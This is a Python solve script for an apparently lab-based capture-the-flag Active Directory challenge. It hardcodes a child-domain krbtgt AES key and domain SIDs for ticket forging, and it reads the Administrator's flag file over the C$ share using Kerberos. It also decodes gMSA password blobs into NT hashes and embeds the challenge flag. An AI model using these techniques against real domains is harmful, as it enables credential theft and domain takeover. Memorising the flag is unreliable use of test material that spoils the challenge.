#!/usr/bin/env python3
"""M&A helpers.

  python3 solve.py read --host DC-OLD.old.velocity.hacklu --domain old.velocity.hacklu \
                        --dc-ip 10.244.0.20
  python3 solve.py gmsa <hex-or-base64 msDS-ManagedPassword blob>
  python3 solve.py assemble

`read` needs an impacket ccache in KRB5CCNAME (`ticketer.py` or `getTGT.py` output).
"""
import argparse
import base64
import binascii
import hashlib
import io
import sys

CHILD_SID = "S-1-5-21-976573591-227444304-1123500008"
PARENT_SID = "S-1-5-21-274105150-4017454061-1646591600"
CHILD_KRBTGT_AES = "6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89"

# C:\Users\Administrator\Desktop\flag.txt from each DC, UTF-16LE + BOM + CRLF.
HALVES = [
    ("DC-OLD  (child) ",    # flag{m0v3_f4st_br34k
     "fffe66006c00610067007b006d003000760033005f0066003400730074005f0062007200330034"
     "006b000d000a00"),
    ("DC-NEW  (parent)",    # _th3_f0r3st_89a71f9g}
     "fffe5f007400680033005f006600300072003300730074005f0038003900610037003100660039"
     "0067007d000d000a00"),
]


def read(args):
    from impacket.smbconnection import SMBConnection

    conn = SMBConnection(args.host, args.host)
    conn.kerberosLogin(args.user, "", args.domain, "", "", None,
                       kdcHost=args.dc_ip or args.host)
    buf = io.BytesIO()
    conn.getFile(args.share, args.file, buf.write)
    data = buf.getvalue()
    print("bytes  :", len(data))
    print("hex    :", data.hex())
    if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
        text = data.decode("utf-16")
    else:
        text = data.decode("utf-8", "replace")
    print("decoded:", repr(text.strip("\ufeff").strip()))


def nt_hash(password_utf16: bytes) -> str:
    """NT hash = MD4 of the UTF-16LE password without the terminating NUL."""
    return hashlib.new("md4", password_utf16).hexdigest()


def gmsa(blob: bytes):
    """msDS-ManagedPassword = GMSA struct; current password = blob[off:end] minus NUL."""
    off = int.from_bytes(blob[8:10], "little")    # current password offset
    end = int.from_bytes(blob[12:14], "little")   # end of current password
    pw = blob[off:end]
    if pw.endswith(b"\x00\x00"):
        pw = pw[:-2]
    print("offset :", off, "end:", end, "password bytes:", len(pw))
    print("password (utf-16le):", pw.decode("utf-16-le", "replace"))
    print("NTHASH :", nt_hash(pw))


def assemble():
    flag = ""
    for name, half in HALVES:
        raw = bytes.fromhex(half)
        text = raw.decode("utf-16").strip("\ufeff").strip()
        print(f"{name} {len(raw):2d} bytes  {text!r}")
        flag += text
    print("\nFLAG:", flag)


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    if sys.argv[1] == "read":
        ap = argparse.ArgumentParser()
        ap.add_argument("--host", required=True)
        ap.add_argument("--domain", required=True)
        ap.add_argument("--dc-ip")
        ap.add_argument("--user", default="Administrator")
        ap.add_argument("--share", default="C$")
        ap.add_argument("--file", default=r"\Users\Administrator\Desktop\flag.txt")
        read(ap.parse_args(sys.argv[2:]))
    elif sys.argv[1] == "gmsa":
        arg = sys.argv[2]
        try:
            gmsa(bytes.fromhex(arg))
        except ValueError:
            gmsa(base64.b64decode(arg))
    elif sys.argv[1] == "assemble":
        assemble()
    else:
        sys.exit(__doc__)


if __name__ == "__main__":
    main()
